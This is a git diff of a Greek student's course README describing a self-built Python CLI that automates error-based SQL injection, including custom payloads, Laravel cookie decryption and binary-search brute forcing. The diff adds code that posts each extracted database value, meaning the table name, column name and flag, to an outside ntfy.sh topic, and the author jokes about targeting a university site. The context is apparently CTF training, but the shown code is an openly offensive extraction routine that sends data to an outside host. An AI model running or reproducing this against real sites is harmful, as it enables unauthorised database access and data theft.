@@ -207,19 +207,34 @@ Pull requests στο [site της ομάδας](https://kafeneio-site-pibook.net
 
 ## :pushpin:: Άσκηση γραμμής εντολών 1 CLI 
 Σε αυτό το παραδοτέο είχαμε να παραδώσουμε μια άσκηση γραμμής εντολών. Αυτή την εβδομάδα λοιπόν αποφάσισα αρχικά να [εγκαταστήσω το void linux](https://github.com/p19tzam/sw/tree/2019213/projects/2019213#void-linux-distro) γιατί στο kiss linux δεν κατάφερα να εγκαταστήσω το i3wm λόγο ότι είχε πάρα πολλά broken packages και ήθελε πάρα πολύ χρόνο για να το fixαρω. Μετά την εγκατάσταση του void linux με αφορμή τις προπονήσεις στο ECSC-GR(Hellenic Cyber Security Team) αποφάσισα να κάνω μια αρκετά custom άσκηση γραμμής εντολών(κατα την γνώμη μου πολύ περίπλοκη για το συγκεκριμένο μάθημα) σε python η οποία ζητάει από τον χρήστη το URL του ευάλωτου site(πχ του ιονίου πανεπιστημίου upsss!) που το συγκεκριμένο URL θα πρέπει να είναι ευάλωτο σε επιθέσεις SQL Injection που σε αυτή την επίθεση ενας “attacker” μπορεί με διάφορες εντολές(SQL Queries η αλλιώς SQL payloads) να τροποποιήσει την βάση δεδομένων του συστήματος πχ να διαβάσει δεδομένα να κάνει delete δεδομένα και γενικότερα να πάρει πρόσβαση με λίγα λόγια. Για να μην πολυλογώ για άσχετα του μαθήματος το “cli’ αυτό κάνει τους εξής αυτοματοποιησμούς:
-
 - [x] Encrypt/Decrypt Laravel Cookies with developed AES cryptofunctions 
 - [x] Webscrape [fetch data from webpage]
 - [x] Laravel(PHP) serialization/deserialization
 - [x] Custom SQL payloads for exfiltrate data from database includes tables names, coluns names, columns data
 - [x] Uses bit shifting & binary searching ascii bruteforce techniques
 - [x] Based on Error based SQL injection
+- [x] Send message automatically with extracted data to my smartphone via ntfy
 
+## UPDATE
+Για να κολλήσει η άσκηση που έκανα με το μάθημα έκανα μερικά updates στο κώδικα τα οποία σε κάθε αποτέλεσμα που εμφανίζει το script τα στέλνει στο smartphone μου για να τα βλέπω live.<br>
+<br>
+Παράδειγμα με τον κώδικα που πρόσθεσα:
+```python
+requests.post("https://ntfy.sh/mytopic", 
+    data="Backup successful 😀".encode(encoding='utf-8'))
+```
 <br>
 Σε αυτό το asciinema βλέπουμε πώς κανει exfiltrate data από μία βάση δεδομένων
 
-[![asciicast](https://asciinema.org/a/480839.svg)](https://asciinema.org/a/480839)
+[![asciicast](https://asciinema.org/a/481465.svg)](https://asciinema.org/a/481465)
 
+
+## SmartPhone Screen Shots
+![1](https://user-images.githubusercontent.com/92382586/160487064-e1926b5f-d0d5-4b26-a7c5-060fc6073773.png)
+
+![2](https://user-images.githubusercontent.com/92382586/160487073-79a83e41-85f0-47f4-9704-e66ca82d3116.png)
+
+![3](https://user-images.githubusercontent.com/92382586/160487081-3c82b6fd-835b-461e-9586-533d9f3083f2.png)
 
 ## Κώδικας 
 ```python
@@ -378,14 +393,25 @@ print('Getting Table Name:', end='\n============================================
 
 table_name = getTableName()
 print('\n-> Table Name: ' + table_name, end='\n')
+requests.post("https://ntfy.sh/secret",
+        data="Table name: "+str(table_name))
+print("Table name messange send successfulfy")
 
 print('\nGetting Column Name:', end='\n==============================================\n')
 column_name = getColumnName(table_name)
 print('\n-> Column Name: ' + column_name, end='\n')
+requests.post("https://ntfy.sh/secret",
+        data="Column name: "+str(column_name))
+print("Column name message send successfully")
 
 print('\nGetting Column Contents:', end='\n==============================================\n')
 column_name = getColumnContents(table_name, column_name)
 print('\n-> Flag: ' + column_name)
+
+requests.post("https://ntfy.sh/secret",
+    data="Flag name: "+str(column_name))
+
+print("Flag message send successfully")
 ```
   
 ## Συμμετοχή και ομαδικότητα
